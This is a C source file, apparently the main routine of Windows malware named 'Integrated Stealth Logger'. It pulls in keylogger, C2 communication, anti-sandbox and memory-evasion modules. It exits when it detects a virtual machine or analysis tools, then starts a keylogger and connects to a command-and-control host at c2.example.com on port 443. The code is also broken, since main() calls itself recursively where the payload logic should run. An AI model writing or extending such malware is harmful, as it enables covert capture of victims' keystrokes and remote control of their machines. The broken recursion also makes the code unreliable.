#include <windows.h>
#include <stdio.h>
#include "stealth_payload.cpp"
#include "logger.c"
#include "keylogger.c"
#include "c2_communication.c"
#include "anti_sandbox.c"
#include "memory_evasion.c"

// Global logger handle
HANDLE hLogger;

int main() {
    printf("Integrated Stealth Logger v1.0\n");
    
    // Run stealth payload initialization
    if (!IsWindows() || !IsRunningFromRemovableDrive() || IsRunningInVM() || IsERDDetected()) {
        printf("Environment check failed - exiting\n");
        return 1;
    }
    
    printf("Environment check passed\n");
    
    // Initialize logger
    hLogger = CreateLogger("stealth_log.txt", LOG_LEVEL_DEBUG);
    if (!hLogger) {
        printf("Failed to create logger\n");
        return 1;
    }
    
    LogMessage(hLogger, LOG_LEVEL_INFO, "Logger initialized successfully");
    
    // Initialize keylogger
    if (!InitializeKeylogger(hLogger)) {
        printf("Failed to initialize keylogger\n");
        CloseLogger(hLogger);
        return 1;
    }
    
    LogMessage(hLogger, LOG_LEVEL_INFO, "Keylogger initialized successfully");
    
    // Initialize C2 communication
    if (!InitializeC2Communication("c2.example.com", 443, hLogger)) {
        printf("Failed to initialize C2 communication\n");
        StopKeylogger();
        CloseLogger(hLogger);
        return 1;
    }
    
    LogMessage(hLogger, LOG_LEVEL_INFO, "C2 communication initialized successfully");
    
    printf("All components initialized successfully\n");
    
    // Run stealth payload main logic
    main();
    
    // Cleanup
    StopKeylogger();
    CloseC2Communication();
    CloseLogger(hLogger);
    
    return 0;
}
